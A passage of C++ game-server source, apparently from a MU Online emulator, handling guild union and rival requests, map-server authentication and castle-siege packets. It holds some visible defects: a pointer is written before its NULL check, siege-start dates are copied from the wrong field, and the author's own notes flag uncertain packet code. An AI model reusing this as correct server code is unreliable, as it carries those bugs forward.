				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
		else if ( aRecv->btRelationShipType == 2 )
		{
			if ( lpGuildInfo->iGuildRival || lpTargetGuildInfo->iGuildRival )
			{
				LogAddTD("%s GUILD_ANS_EXIST_RIVAL;",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_EXIST_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( btRelationShip == 1 )
			{
				LogAddTD("%s GUILD_ANS_EXIST_RELATIONSHIP_UNION;",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_EXIST_RELATIONSHIP_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
	}
	else if ( aRecv->btRequestType == 2 )
	{
		if ( aRecv->btRelationShipType == 1 )
		{
			if ( lpGuildInfo->iGuildUnion == 0 )
			{
				LogAddTD("%s GUILD_ANS_NOTEXIST_UNION; 1",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
		else if ( aRecv->btRelationShipType == 2 )
		{
			if ( !lpGuildInfo->iGuildRival || !lpTargetGuildInfo->iGuildRival )
			{
				LogAddTD("%s GUILD_ANS_NOTEXIST_UNION; 2",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( lpGuildInfo->iGuildRival != lpTargetGuildInfo->Number || lpGuildInfo->Number != lpTargetGuildInfo->iGuildRival )
			{
				LogAddTD("%s GUILD_ANS_NOT_GUILD_RIVAL; 2",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_NOT_GUILD_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
	}		
	
	if ( aRecv->btRequestType == 2 )
	{
		if ( aRecv->btRelationShipType == 1 )
		{
			LogAddTD("%s  GDUnionBreakOff(aIndex, lpGuildInfo->iGuildUnion);",__FUNCTION__);

			GDUnionBreakOff(aIndex, lpGuildInfo->iGuildUnion);
			return;
		}
	}

	lpObj->m_IfState.use = 1;
	lpObj->m_IfState.type = 14;
	lpObj->m_IfState.state = 0;
	lpObj->m_InterfaceTime = GetTickCount();

	lpTargetObj->m_IfState.use = 1;
	lpTargetObj->m_IfState.type = 14;
	lpTargetObj->m_IfState.state = 0;
	lpTargetObj->m_InterfaceTime = GetTickCount();

	PMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ pMsg={0};

	PHeadSetB((LPBYTE)&pMsg, 0xE5, sizeof(pMsg));
	pMsg.btTargetUserIndexL = SET_NUMBERL(aIndex);
	pMsg.btTargetUserIndexH = SET_NUMBERH(aIndex);
	pMsg.btRequestType = aRecv->btRequestType;
	pMsg.btRelationShipType = aRecv->btRelationShipType;
	
	//LogAddTD("%s  Send Request: %d",__FUNCTION__,iTargetUserIndex);
	DataSend(iTargetUserIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




void CGRelationShipAnsJoinBreakOff(PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS * aRecv, int aIndex)
{
	int iTargetUserIndex = MAKE_NUMBERW(aRecv->btTargetUserIndexH, aRecv->btTargetUserIndexL);

	if ( !OBJMAX_RANGE(aIndex) || !OBJMAX_RANGE(iTargetUserIndex))
		return;

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	if ( gObjIsConnected(&gObj[iTargetUserIndex]) == FALSE )
	{
		GCResultSend(aIndex, 0x51, 3);
		return;
	}

	if ( aRecv->btResult == 1 )
	{
		if ( aRecv->btRequestType == 1 )
		{
			GDRelationShipReqJoin(iTargetUserIndex, aIndex, aRecv->btRelationShipType);
		}
		else if ( aRecv->btRequestType == 2 )
		{
			GDRelationShipReqBreakOff(aIndex, iTargetUserIndex, aRecv->btRelationShipType);
		}
	}
	else
	{
		PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg ={0};

		PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof(ErrMsg));
		ErrMsg.btResult = 0;
		ErrMsg.btRequestType = aRecv->btRequestType;
		ErrMsg.btRelationShipType = aRecv->btRelationShipType;
		ErrMsg.btTargetUserIndexH = aRecv->btTargetUserIndexH;
		ErrMsg.btTargetUserIndexL = aRecv->btTargetUserIndexL;
		ErrMsg.btResult = GUILD_ANS_CANCLE_REQUEST;

		DataSend(iTargetUserIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
	}

	if ( gObj[aIndex].m_IfState.use )
	{
		if ( gObj[aIndex].m_IfState.type == 14 )
		{
			gObj[aIndex].m_IfState.use = 0;
		}
	}

	if ( gObj[iTargetUserIndex].m_IfState.use )
	{
		if ( gObj[iTargetUserIndex].m_IfState.type == 14 )
		{
			gObj[iTargetUserIndex].m_IfState.use = 0;
		}
	}
}




void CGUnionList(PMSG_UNIONLIST_REQ * aRecv, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj == NULL )
	{
		return;
	}

	if ( gObjIsConnected(&gObj[aIndex]) == FALSE )
	{
		GCResultSend(aIndex, 0x51, 3);
		return;
	}

	if ( lpObj->lpGuild == NULL )
	{
		GCResultSend(aIndex, 0x51, 3);
		return;
	}

	if ( lpObj->lpGuild->iGuildUnion == 0 )
	{
		GCResultSend(aIndex, 0x51, 3);
		return;
	}

	GDUnionListSend(aIndex, lpObj->lpGuild->iGuildUnion);

}



void CGRelationShipReqKickOutUnionMember(PMSG_KICKOUT_UNIONMEMBER_REQ* aRecv, int aIndex)
{
	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( ::PacketCheckTime(&gObj[aIndex]) == FALSE )
		return;

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj == NULL )
		return;

	if ( gObjIsConnected(&gObj[aIndex]) == FALSE )
	{
		GCResultSend(aIndex, 0x51, 3);
		MsgOutput(aIndex, "Terminated User.");
		return;
	}

	if ( lpObj->lpGuild == NULL )
	{
		GCResultSend(aIndex, 0x51, 3);
		MsgOutput(aIndex, "Terminated Guild.");
		return;
	}

	PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg = {0};

	PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof(ErrMsg));
	ErrMsg.btResult = 0;
	ErrMsg.btRequestType = 2;
	ErrMsg.btRelationShipType = 1;
	ErrMsg.btTargetUserIndexH = 0;
	ErrMsg.btTargetUserIndexL = 0;


	if ( lpObj->lpGuild->iGuildUnion == 0 )
	{
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);

		return;
	}

	if ( lpObj->GuildStatus != GUILD_MASTER || lpObj->lpGuild->Number != lpObj->lpGuild->iGuildUnion)
	{
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);

		return;
	}

	char szUnionMemberGuildName[MAX_GUILD_LEN+1] = {0};
	memcpy(szUnionMemberGuildName, aRecv->szTargetGuildName, MAX_GUILD_LEN);

	if ( !strcmp(lpObj->lpGuild->Name, szUnionMemberGuildName))
	{
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);

		return;
	}

	GDRelationShipReqKickOutUnionMember(aIndex, szUnionMemberGuildName);
}




void CGReqMapSvrAuth(PMSG_REQ_MAPSERVERAUTH * lpMsg, int iIndex)
{
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if ( lpMsg->btCliVersion[0] != szClientVersion[0] ||
		 lpMsg->btCliVersion[1] != szClientVersion[1] ||
		 lpMsg->btCliVersion[2] != szClientVersion[2] ||
		 lpMsg->btCliVersion[3] != szClientVersion[3] ||
		 lpMsg->btCliVersion[4] != szClientVersion[4] )
	{
		GCAnsMapSvrAuth(iIndex, 6);
		LogAddC(2,"[CGReqMapSvrAuth] Index: %d",iIndex);
		CloseClient(iIndex);

		return;
	}

	BYTE btSerial[17];

	btSerial[16]=0;
	memcpy(btSerial, lpMsg->btCliSerial, sizeof(lpMsg->btCliSerial));
	char id[MAX_ACCOUNT_LEN+1];
	id[MAX_ACCOUNT_LEN] = 0;
	memcpy(id, lpMsg->szAccountID, MAX_ACCOUNT_LEN);
	BuxConvert(id, MAX_ACCOUNT_LEN);

	if ( strcmp((char*)btSerial, szGameServerExeSerial) )
	{
		LogAddC(2, "error-L1: Serial error [%s] [%s]", id, btSerial);
		GCAnsMapSvrAuth(iIndex, 6);
		CloseClient(iIndex);

		return;
	}

	if ( bCanConnectMember == TRUE )
	{
		if ( ConMember.IsMember(id) == FALSE )
		{
			GCAnsMapSvrAuth(iIndex, 2);	
			
			return;
		}
	}

	LPOBJ lpObj = &gObj[iIndex];

	if ( PacketCheckTime(lpObj) == FALSE )
	{
		LogAdd(lMsg.Get(MSGGET(1, 217)), iIndex, id);
		CloseClient(iIndex);

		return;
	}

	if ( gObj[iIndex].Connected != PLAYER_CONNECTED )
	{
		LogAdd(lMsg.Get(MSGGET(1, 218)), iIndex, id);
		CloseClient(iIndex);

		return;
	}

	if ( gObj[iIndex].LoginMsgSnd != 0 )
	{
		if ( gObj[iIndex].LoginMsgSnd == 1 )
		{
			LogAdd(lMsg.Get(MSGGET(1, 219)), iIndex, id, gObj[iIndex].Ip_addr);
		}
		else
		{
			LogAdd("error : %d %s %d", gObj[iIndex].LoginMsgSnd, __FILE__, __LINE__);
		}

		return;
	}

/*
	gObj[iIndex].CheckTick = GetTickCount();//lpMsg->iTickCount;
	gObj[iIndex].CheckTick2 = 0;//GetTickCount();
	gObj[iIndex].ConnectCheckTime = GetTickCount(); 
	gObj[iIndex].CheckSpeedHack = true;
	gObj[iIndex].ConnectCheckTime = GetTickCount();
	gObj[iIndex].LoginMsgSnd = 1;
	gObj[iIndex].LoginMsgCount++;
	gObj[iIndex].AccountID[MAX_ACCOUNT_LEN] = 0;
	memcpy(gObj[iIndex].AccountID, id, MAX_ACCOUNT_LEN);
	memset(gObj[iIndex].Name, 0, MAX_ACCOUNT_LEN);
	gObj[iIndex].m_cAccountItemBlock = 0;
	GJReqMapSvrAuth(iIndex, gObj[iIndex].AccountID, lpMsg->szCharName,
		lpMsg->iJoinAuthCode1, lpMsg->iJoinAuthCode2,
		lpMsg->iJoinAuthCode3, lpMsg->iJoinAuthCode4);

	LogAddTD("[MapServerMng] Map Server Join Send : [%s][%s](%d)",
		gObj[iIndex].AccountID, gObj[iIndex].Name, iIndex);
*/

	gObj[iIndex].CheckTick = lpMsg->iTickCount;
	gObj[iIndex].CheckTick2 = GetTickCount();
	gObj[iIndex].CheckSpeedHack = true;
	gObj[iIndex].ConnectCheckTime = GetTickCount();
	gObj[iIndex].LoginMsgSnd = 1;
	gObj[iIndex].LoginMsgCount++;
	gObj[iIndex].AccountID[MAX_ACCOUNT_LEN] = 0;
	memcpy(gObj[iIndex].AccountID, id, MAX_ACCOUNT_LEN);
	memset(gObj[iIndex].Name, 0, MAX_ACCOUNT_LEN);
	gObj[iIndex].m_cAccountItemBlock = 0;
	GJReqMapSvrAuth(iIndex, gObj[iIndex].AccountID, lpMsg->szCharName,
		lpMsg->iJoinAuthCode1, lpMsg->iJoinAuthCode2,
		lpMsg->iJoinAuthCode3, lpMsg->iJoinAuthCode4);

	LogAddTD("[MapServerMng] Map Server Join Send : [%s][%s](%d)",
		gObj[iIndex].AccountID, gObj[iIndex].Name, iIndex);

	GDGetAccounExtraInfo(iIndex,gObj[iIndex].AccountID);

	//Moved To -> JGGetCharacterInfo, JGGetCharacterInfoS6E2
	//Fix for map move, or no info received and get Goblin Points from CM [DaRKav]
	//GetAccountExServerInfo(iIndex,SCFExDB_GSSend_CShopMuItemShopGetList);

	//#if(ENABLE_CSHOP == 1)
	//		GDAskCShopList(iIndex,gObj[iIndex].AccountID);
	//#endif
}


struct PMSG_ANS_MAPSERVERAUTH
{
	PBMSG_HEAD2 h;	// C1:B1:01
	BYTE iResult;	// 4
};


void GCAnsMapSvrAuth(int iIndex, int iResult)
{
	if ( !OBJMAX_RANGE(iIndex) )
	{
		LogAddC(2,"[MapServerMng] Packet Error JG [0x7B] - Index out of bound : %d",iIndex);
		return;
	}

	PMSG_ANS_MAPSERVERAUTH pMsgResult;

	PHeadSubSetB((LPBYTE)&pMsgResult, 0xB1, 0x01, sizeof(pMsgResult));
	pMsgResult.iResult = iResult;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}



void CGReqCastleSiegeState(PMSG_REQ_CASTLESIEGESTATE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	GS_GDReqOwnerGuildMaster(g_MapServerManager.GetMapSvrGroup(), iIndex);
#endif
}

struct PMSG_ANS_CASTLESIEGESTATE {// <size 0x2e>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ char cCastleSiegeState;
  /*<thisrel this+0x6>*/ /*|0x1|*/ unsigned char btStartYearH;
  /*<thisrel this+0x7>*/ /*|0x1|*/ unsigned char btStartYearL;
  /*<thisrel this+0x8>*/ /*|0x1|*/ unsigned char btStartMonth;
  /*<thisrel this+0x9>*/ /*|0x1|*/ unsigned char btStartDay;
  /*<thisrel this+0xa>*/ /*|0x1|*/ unsigned char btStartHour;
  /*<thisrel this+0xb>*/ /*|0x1|*/ unsigned char btStartMinute;
  /*<thisrel this+0xc>*/ /*|0x1|*/ unsigned char btEndYearH;
  /*<thisrel this+0xd>*/ /*|0x1|*/ unsigned char btEndYearL;
  /*<thisrel this+0xe>*/ /*|0x1|*/ unsigned char btEndMonth;
  /*<thisrel this+0xf>*/ /*|0x1|*/ unsigned char btEndDay;
  /*<thisrel this+0x10>*/ /*|0x1|*/ unsigned char btEndHour;
  /*<thisrel this+0x11>*/ /*|0x1|*/ unsigned char btEndMinute;
  /*<thisrel this+0x12>*/ /*|0x1|*/ unsigned char btSiegeStartYearH;
  /*<thisrel this+0x13>*/ /*|0x1|*/ unsigned char btSiegeStartYearL;
  /*<thisrel this+0x14>*/ /*|0x1|*/ unsigned char btSiegeStartMonth;
  /*<thisrel this+0x15>*/ /*|0x1|*/ unsigned char btSiegeStartDay;
  /*<thisrel this+0x16>*/ /*|0x1|*/ unsigned char btSiegeStartHour;
  /*<thisrel this+0x17>*/ /*|0x1|*/ unsigned char btSiegeStartMinute;
  /*<thisrel this+0x18>*/ /*|0x8|*/ char cOwnerGuild[8];
  /*<thisrel this+0x20>*/ /*|0xa|*/ char cOwnerGuildMaster[10];
  /*<thisrel this+0x2a>*/ /*|0x1|*/ char btStateLeftSec1;
  /*<thisrel this+0x2b>*/ /*|0x1|*/ char btStateLeftSec2;
  /*<thisrel this+0x2c>*/ /*|0x1|*/ char btStateLeftSec3;
  /*<thisrel this+0x2d>*/ /*|0x1|*/ char btStateLeftSec4;
};

void GCAnsCastleSiegeState(int iIndex, int iResult, LPSTR lpszGuildName, LPSTR lpszGuildMaster)
{
#if (GS_CASTLE==1)
	if( (lpszGuildName == NULL) || (lpszGuildMaster == NULL) )
		return;

	PMSG_ANS_CASTLESIEGESTATE pMsgResult;
	SYSTEMTIME tmStateStartDate;
	SYSTEMTIME tmSiegeStartDate;
	SYSTEMTIME tmStateEndDate;

	pMsgResult.h.set((LPBYTE)&pMsgResult.h, 0xB2, 0x00, sizeof(pMsgResult));

	pMsgResult.btResult = iResult;

	memcpy(pMsgResult.cOwnerGuild, lpszGuildName, sizeof(pMsgResult.cOwnerGuild));
	memcpy(pMsgResult.cOwnerGuildMaster, lpszGuildMaster, sizeof(pMsgResult.cOwnerGuildMaster));

	memset(&tmStateStartDate, 0, sizeof(tmStateStartDate));
	memset(&tmStateEndDate, 0, sizeof(tmStateEndDate));
	memset(&tmSiegeStartDate, 0, sizeof(tmSiegeStartDate));

	int iCastleState = g_CastleSiege.GetCastleState();
	int bRETVAL = g_CastleSiege.GetCastleStateTerm(&tmStateStartDate, &tmStateEndDate);
	tmSiegeStartDate = g_CastleSiege.GetCastleLeftSiegeDate();

	if( bRETVAL == FALSE )
	{
		iCastleState = -1;
	}
	#pragma message(" NOTE : I don't know if the function is correct")

	int iStateLeftSec = g_CastleSiege.GetCurRemainSec();

	// Create Packet
	pMsgResult.cCastleSiegeState = iCastleState;
	// Start Date
	pMsgResult.btStartYearH = SET_NUMBERLW(SET_NUMBERH(tmStateStartDate.wYear));
	pMsgResult.btStartYearL = SET_NUMBERLW(SET_NUMBERL(tmStateStartDate.wYear));
	pMsgResult.btStartMonth = tmStateStartDate.wMonth;
	pMsgResult.btStartDay   = tmStateStartDate.wDay;
	pMsgResult.btStartHour  = tmStateStartDate.wHour;
	pMsgResult.btStartMinute= tmStateStartDate.wMinute;
	// End Date
	pMsgResult.btEndYearH = SET_NUMBERLW(SET_NUMBERH(tmStateEndDate.wYear));
	pMsgResult.btEndYearL = SET_NUMBERLW(SET_NUMBERL(tmStateEndDate.wYear));
	pMsgResult.btEndMonth = tmStateEndDate.wMonth;
	pMsgResult.btEndDay   = tmStateEndDate.wDay;
	pMsgResult.btEndHour  = tmStateEndDate.wHour;
	pMsgResult.btEndMinute= tmStateEndDate.wMinute;
	// Siege Start Date
	pMsgResult.btSiegeStartYearH = SET_NUMBERLW(SET_NUMBERH(tmStateStartDate.wYear));
	pMsgResult.btSiegeStartYearL = SET_NUMBERLW(SET_NUMBERL(tmStateStartDate.wYear));
	pMsgResult.btSiegeStartMonth = tmStateStartDate.wMonth;
	pMsgResult.btSiegeStartDay   = tmStateStartDate.wDay;
	pMsgResult.btSiegeStartHour  = tmStateStartDate.wHour;
	pMsgResult.btSiegeStartMinute= tmStateStartDate.wMinute;
	// Time Left
	#pragma message(" NOTE : Check this CastleSiege packet")
	pMsgResult.btStateLeftSec1 = SET_NUMBERH(SET_NUMBERLW(SET_NUMBERHW(iStateLeftSec)));
	pMsgResult.btStateLeftSec2 = SET_NUMBERL(SET_NUMBERLW(SET_NUMBERHW(iStateLeftSec)));
	pMsgResult.btStateLeftSec3 = SET_NUMBERH(SET_NUMBERLW(SET_NUMBERLW(iStateLeftSec)));
	pMsgResult.btStateLeftSec4 = SET_NUMBERL(SET_NUMBERLW(SET_NUMBERHW(iStateLeftSec)));

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


void CGReqRegCastleSiege(PMSG_REQ_REGCASTLESIEGE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if(OBJMAX_RANGE(iIndex) == 0)
	{
		return;
	}

	if( g_CastleSiege.GetCastleState() != 1 )
	{
		GCAnsRegCastleSiege(iIndex, 7, "");
		return;
	}

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
	{
		GCAnsRegCastleSiege(iIndex, 6, "");
		return;
	}

	if( g_CastleSiege.CheckCastleOwnerMember(iIndex) == TRUE || g_CastleSiege.CheckCastleOwnerUnionMember(iIndex) == TRUE)
	{
		GCAnsRegCastleSiege(iIndex, 3, "");
		return;	
	}

	if(g_CastleSiege.CheckUnionGuildMasterOrAssistant(iIndex) == TRUE)
	{
		TUnionInfo * pUnionInfo = UnionManager.SearchUnion(gObj[iIndex].lpGuild->iGuildUnion);

		if ( pUnionInfo )
		{
			GS_GDReqRegAttackGuild(g_MapServerManager.GetMapSvrGroup(), iIndex);
			return;
		}else
		{
			GCServerMsgStringSend ("You have to have Union with other Guild!",iIndex,0x01 ) ;
		}
	} else {
		GCServerMsgStringSend ("You have to have Union with other Guild!",iIndex,0x01 ) ;
	}

	GCAnsRegCastleSiege(iIndex, 0, "");
#endif
}

struct PMSG_ANS_REGCASTLESIEGE { // <size 0xd>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x8|*/ char szGuildName[8];
};

void GCAnsRegCastleSiege(int iIndex, int iResult, LPSTR lpszGuildName)
{
#if (GS_CASTLE==1)
	PMSG_ANS_REGCASTLESIEGE pMsgResult;

	if( lpszGuildName == NULL )
		return;

	if( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x01, sizeof(pMsgResult));

	pMsgResult.btResult = iResult;
	memcpy(&pMsgResult.szGuildName, lpszGuildName, sizeof(pMsgResult.szGuildName));

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

	if( ::gObjIsConnected(iIndex) )
	{
		::LogAddTD("[CastleSiege] [%s][%s] Registered Castle Siege (GUILD:%s) - Result:%d",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, iResult);
	}
#endif
}




void CGReqGiveUpCastleSiege(PMSG_REQ_GIVEUPCASTLESIEGE * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	if( (g_CastleSiege.GetCastleState() >= 1) && (g_CastleSiege.GetCastleState() <= 3) )
	{
		GCAnsGiveUpCastleSiege(iIndex, 3, 0, 0, "");

		return;
	}
	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;
	
	if( g_CastleSiege.CheckUnionGuildMasterOrAssistant(iIndex) == FALSE )
		return;

	GS_GDReqGuildSetGiveUp(g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->btGiveUp);
#endif
}

struct PMSG_ANS_GIVEUPCASTLESIEGE { // <size 0xe>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x1|*/ unsigned char btIsGiveUp;
  /*<thisrel this+0x6>*/ /*|0x8|*/ char szGuildName[8];
};


void GCAnsGiveUpCastleSiege(int iIndex, int iResult, int bGiveUp, int iMarkCount, LPSTR lpszGuildName)
{
#if (GS_CASTLE==1)
	PMSG_ANS_GIVEUPCASTLESIEGE pMsgResult;

	if( lpszGuildName == NULL )
		return;
	if( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x02, sizeof(pMsgResult));
	pMsgResult.btResult = iResult;
	pMsgResult.btIsGiveUp = bGiveUp;

	memcpy(&pMsgResult.szGuildName, lpszGuildName, sizeof(pMsgResult.szGuildName));

	if( (pMsgResult.btResult == 1) && (iMarkCount > 0) )
	{
		__int64 tmpZen = (__int64)gObj[iIndex].Money + (__int64)(iMarkCount*3000);
		if( tmpZen > MAX_ZEN ) 
		{
			gObj[iIndex].Money = MAX_ZEN;
		} else {
			gObj[iIndex].Money += (iMarkCount*3000);
		}

		GCMoneySend(iIndex, gObj[iIndex].Money);
	}
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

	if( gObjIsConnected(iIndex) )
	{
		LogAddTD("[CastleSiege] [%s][%s] GiveUp Castle Siege (GUILD:%s) - Result:%d",
			gObj[iIndex].AccountID, gObj[iIndex].Name, gObj[iIndex].GuildName, iResult);
	}
#endif
}




void CGReqGuildRegInfo(PMSG_REQ_GUILDREGINFO * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)

	if( lpMsg == NULL )
		return;

	if( strcmp(gObj[iIndex].GuildName, "") == 0 )
		return;

	GS_GDReqGuildMarkRegInfo(g_MapServerManager.GetMapSvrGroup(), iIndex);
#endif
}


struct PMSG_ANS_GUILDREGINFO {// <size 0x13>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x8|*/ char szGuildName[8];
  /*<thisrel this+0xd>*/ /*|0x1|*/ unsigned char btGuildMark1;
  /*<thisrel this+0xe>*/ /*|0x1|*/ unsigned char btGuildMark2;
  /*<thisrel this+0xf>*/ /*|0x1|*/ unsigned char btGuildMark3;
  /*<thisrel this+0x10>*/ /*|0x1|*/ unsigned char btGuildMark4;
  /*<thisrel this+0x11>*/ /*|0x1|*/ unsigned char btIsGiveUp;
  /*<thisrel this+0x12>*/ /*|0x1|*/ unsigned char btRegRank;
};

void GCAnsGuildRegInfo(int iIndex, int iResult, CSP_ANS_GUILDREGINFO* lpMsgResult)
{
#if (GS_CASTLE==1)
	PMSG_ANS_GUILDREGINFO pMsgResult;

	if( lpMsgResult == NULL )
		return;

	if( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x03, sizeof(pMsgResult));

	pMsgResult.btResult = iResult;
	
	WORD hiWord = SET_NUMBERHW(lpMsgResult->iRegMarkCount);
	WORD loWord = SET_NUMBERLW(lpMsgResult->iRegMarkCount);
	pMsgResult.btGuildMark1 = SET_NUMBERH(hiWord);
	pMsgResult.btGuildMark2 = SET_NUMBERL(hiWord);
	pMsgResult.btGuildMark3 = SET_NUMBERH(loWord);
	pMsgResult.btGuildMark4 = SET_NUMBERL(loWord);
	
	pMsgResult.btIsGiveUp = lpMsgResult->bIsGiveUp;
	pMsgResult.btRegRank = lpMsgResult->btRegRank;
	memcpy(&pMsgResult.szGuildName, lpMsgResult->szGuildName, sizeof(pMsgResult.szGuildName));

	LogAddTD("[CastleSiege] Guild(%s) Registration Info => Result:%d/%d, Marks:%d, Rank:%d, GiveUp:%d ",
		lpMsgResult->szGuildName, 
		iResult, lpMsgResult->iResult, lpMsgResult->iRegMarkCount, 
		lpMsgResult->btRegRank, lpMsgResult->bIsGiveUp
	) ;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);


#endif
}

struct PMSG_ANS_REGGUILDMARK { // <size 0x11>
  /*<thisrel this+0x0>*/ /*|0x4|*/ PBMSG_HEAD2 h;
  /*<thisrel this+0x4>*/ /*|0x1|*/ unsigned char btResult;
  /*<thisrel this+0x5>*/ /*|0x8|*/ char szGuildName[8];
  /*<thisrel this+0xd>*/ /*|0x1|*/ unsigned char btGuildMark1;
  /*<thisrel this+0xe>*/ /*|0x1|*/ unsigned char btGuildMark2;
  /*<thisrel this+0xf>*/ /*|0x1|*/ unsigned char btGuildMark3;
  /*<thisrel this+0x10>*/ /*|0x1|*/ unsigned char btGuildMark4;
};

void CGReqRegGuildMark(PMSG_REQ_REGGUILDMARK * lpMsg, int iIndex)
{
#if (GS_CASTLE==1)
	lpMsg->btItemPos += 12;
	if( lpMsg == NULL )
		return;
	
	if( OBJMAX_RANGE(iIndex) == FALSE )
		return;
	
	//if( gObj[iIndex].UseEventServer == true )
	//	return;

	gObj[iIndex].UseEventServer = true;

	if( g_CastleSiege.GetCastleState() != 3 )
	{
		gObj[iIndex].UseEventServer = false;
		return;
	}

	if( strcmp( gObj[iIndex].GuildName, "") == 0)
	{
		gObj[iIndex].UseEventServer = false;
		return;
	}
	
	#pragma message(" NOTE : There Should be a define, but i didn't find one ")
	
	if( CHECK_LIMIT(lpMsg->btItemPos, 74) == FALSE )
	{
		PMSG_ANS_REGGUILDMARK pMsgResult = {0};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(pMsgResult));
		pMsgResult.btResult = 3;		
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
		gObj[iIndex].UseEventServer = false;
	}
	else
	{
		int iItemPos = lpMsg->btItemPos;

		if( gObj[iIndex].pInventory[iItemPos].IsItem() == FALSE )
		{
			PMSG_ANS_REGGUILDMARK pMsgResult = {0};
			pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(pMsgResult));
			pMsgResult.btResult = 3;		
			DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
			gObj[iIndex].UseEventServer = false;
		}
		else
		{
			if( gObj[iIndex].pInventory[iItemPos].m_Type == ITEMGET(14,21) )
			{
				if( gObj[iIndex].pInventory[iItemPos].m_Level == 3 )
				{
					//Guild Mark Registration Fix
					if( (gObj[iIndex].pInventory[iItemPos].m_Durability) > 0.0)
					{
						//PMSG_ANS_REGGUILDMARK pMsgResult = {0};
						//pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(pMsgResult));
						//pMsgResult.btResult = 3;		
						//DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
						//gObj[iIndex].UseEventServer = false;

						GS_GDReqRegGuildMark(g_MapServerManager.GetMapSvrGroup(), iIndex, iItemPos);
					} else {
						gObjInventoryDeleteItem(iIndex, iItemPos);
					}
				}
			}
		}
	}
#endif
}

void GCAnsRegGuildMark(int iIndex, int iResult, CSP_ANS_GUILDREGMARK* lpMsgResult)
{
#if (GS_CASTLE==1)
	PMSG_ANS_REGGUILDMARK pMsgResult;

	if( lpMsgResult == NULL )
		return;

	if( OBJMAX_RANGE(iIndex) == FALSE )
		return;

	if( gObj[iIndex].pInventory[lpMsgResult->iItemPos].IsItem() == FALSE )
	{
		pMsgResult = PMSG_ANS_REGGUILDMARK();

		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(pMsgResult));
		pMsgResult.btResult = 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

		gObj[iIndex].UseEventServer = false;
	}
	else
	{
